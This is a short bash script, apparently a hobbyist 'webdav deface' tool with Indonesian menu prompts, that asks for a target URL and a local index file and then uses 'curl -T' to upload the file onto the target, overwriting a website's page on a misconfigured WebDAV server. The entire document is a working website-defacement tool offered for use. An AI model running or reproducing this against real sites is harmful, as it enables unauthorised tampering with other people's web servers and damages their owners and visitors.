clear
echo '''
webdav By radithya framework
'''
echo ''
echo ''
echo 'welcome to script Deface'
echo ''
echo '
[1] deface[#]
[2] exit[#]
'
echo ''
echo ''
echo ''
read -p 'pilih nomor berapa: ' pilih

if
[ $pilih = 1 ]
then
read -p 'target anda: ' target
read -p 'file index anda: ' file
curl -T  $file  $target
fi
if
[ $pilih = 2 ]
then
echo 'byee'
exit
fi
